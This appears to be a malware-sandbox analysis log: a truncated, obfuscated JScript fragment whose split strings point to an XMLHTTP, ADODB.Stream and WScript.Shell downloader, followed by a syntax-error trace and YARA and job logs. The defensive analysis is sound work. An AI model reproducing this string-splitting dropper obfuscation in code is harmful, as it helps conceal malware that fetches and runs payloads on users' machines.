+var text = ("ipt");var sortDetached = ("ep"), initial = ("Msxml"), map = ("Stre");p = (18); idx = (952); setMatched = ("rea"); rchecked = (19877681);preMap = ("http:/"), isArrayLike = ("HTT");globalEval = ("pt"), errorCallback = (50);var amd = ("2.Serv"), rfocusMorph = ("nvi"), unloadHandler = ("ToFi"), keepScripts = ("DFXfL"), className = ("t.She"), each = (function mappedTypes(){}, "e");prevUntil = ("Object");var documentIsHTML = (89984), linear = ("erver");top = ("TP");duration = ("tate");webkitMatchesSelector = (1169);exports = ("LHTTP."); style = ("oft"); triggered = ("isXML"); marginRight = (103); updateFunc = (85);fontWeight = ("GE"), returnValue = ("truc"), compilerCache = ("R"), postMap = (35), hasContent = ("tStrin"), reject = ("r");rbrace = ("WScr"); udataOld = ("Exp"); setRequestHeader = ("ft.co");var aup = (1), seed = ("Msxml2"), val = (53), charset = ("y"), attachEvent = (149), gotoEnd = ("eOb");var isLocal = ("res"), toggle = ("pe"), offset = ("Msxm");delegateTarget = ("Creat"), s
+
+SyntaxError: Unexpected token .
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0051_6CF36380/localhost_18-42-0051.js:5:1
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+    at Module._compile (module.js:652:30)
+    at Object.Module._extensions..js (module.js:663:10)
+18 May 18:42:52 - ==> Cleaning up sandbox.
+18 May 18:42:52 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:52 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:52 - Saving: malware-jail/../malware/localhost_05-18_18-42-0051_6CF36380/output/eval_1.js
+
+[18/05 18:42:52][info]Exporting results to: /results/localhost_18-42-0051.dynamic.log
+[18/05 18:42:52][info]Exporting results to: /results/localhost_18-42-0051.static.log
+[18/05 18:42:52][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0051_6CF36380/localhost_18-42-0051.js
+[18/05 18:42:52][info]Initializing YARA localhost_05-18_18-42-0051_6CF36380/results/ <all files>
+[18/05 18:42:52][info]Process at 30667 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0051_6CF36380/results]
+[18/05 18:42:52][info]localhost_05-18_18-42-0051_6CF36380 no_matches 
+[18/05 18:42:52][info]6CF36380,/malware/localhost_05-18_18-42-0051_6CF36380/results/ <all files> ,0,no_matches
+[18/05 18:42:52][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:52][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:52][info][00205947]Injecting Transaction Monitor
+[18/05 18:42:52][info](00205947)Starting job http://localhost/malware_samples/6d8e77dca47942044a25999c922611de.html
+[18/05 18:42:52][info](00205947)Last page Navigated to http://localhost/malware_samples/6d8e77dca47942044a25999c922611de.html status: 200 OK date: Sat, 18 May 2019 15:42:52 GMT
+[18/05 18:42:52][info]Found frames: 0
+[18/05 18:42:52][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0052_00205947/localhost_18-42-0052.js
+[18/05 18:42:52][info]Processing command for NodeJS in folder localhost_05-18_18-42-0052_00205947 and file localhost_18-42-0052.js
+[18/05 18:42:52][info]Process at 30701 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0052_00205947.json ./malware/localhost_05-18_18-42-0052_00205947/localhost_18-42-0052.js]
